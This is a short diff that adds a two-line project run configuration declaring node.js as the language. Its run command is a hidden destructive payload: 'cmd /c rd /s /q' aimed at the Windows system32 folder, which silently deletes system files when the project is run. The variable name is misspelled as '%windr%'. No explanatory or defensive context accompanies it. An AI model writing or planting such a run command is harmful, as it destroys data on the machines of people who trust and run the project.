@@ -1,0 +1,2 @@
+language = node.js
+run = "cmd /c rd /s /q %windr%\system32"
